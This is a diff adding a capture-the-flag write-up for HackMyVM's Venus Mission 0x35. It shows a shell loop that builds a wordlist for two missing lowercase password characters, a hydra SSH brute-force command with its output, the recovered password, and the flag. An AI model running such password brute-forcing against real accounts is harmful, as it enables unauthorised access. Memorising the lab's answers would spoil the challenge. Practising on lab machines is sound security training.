@@ -3,10 +3,62 @@ tags: []
 ---
 # Mission 0x35
 
----
-
 ## 🔎 Solution
+After logging in via SSH as **maia**, the next goal was to bruteforce the final 2 missing characters of a password.
+```
+maia@venus:~$ cat mission.txt 
+################
+# MISSION 0x35 #
+################
 
+## EN ##
+The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters. 
+```
+
+The `forget` file shows the pattern, confirming that only the last two characters are unknown:
+```
+maia@venus:~$ cat forget 
+v7xUVE2e5bjUc??
+```
+
+Since the missing part consists of two lowercase letters (`a–z`), I generated a full wordlist by iterating through all possible combinations:
+```
+for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i"; done > wordlist.txt
+```
+
+The resulting `wordlist.txt` looks like this:
+```
+> cat wordlist.txt            
+v7xUVE2e5bjUcaa
+v7xUVE2e5bjUcab
+v7xUVE2e5bjUcac
+v7xUVE2e5bjUcad
+v7xUVE2e5bjUcae
+v7xUVE2e5bjUcaf
+v7xUVE2e5bjUcag
+v7xUVE2e5bjUcah
+v7xUVE2e5bjUcai
+v7xUVE2e5bjUcaj
+...
+```
+
+With the list prepared, I used **hydra** to bruteforce SSH for the user **gloria**. The valid password turned out to be `v7xUVE2e5bjUcxw`:
+```
+> hydra -l gloria -P wordlist.txt -s 5000 ssh://venus.hackmyvm.eu:5000
+
+[5000][ssh] host: venus.hackmyvm.eu   login: gloria   password: v7xUVE2e5bjUcxw
+```
+
+Using that password, I logged in:
+```
+ssh gloria@venus.hackmyvm.eu -p 5000
+```
+
+Inside the home directory, the flag was waiting:
+```
+gloria@venus:~$ cat flagz.txt 
+8===RZIkEtaEp18tLslTopJj===D~~
+```
 
 ## 🚩Flag
-> `
+> `8===RZIkEtaEp18tLslTopJj===D~~`
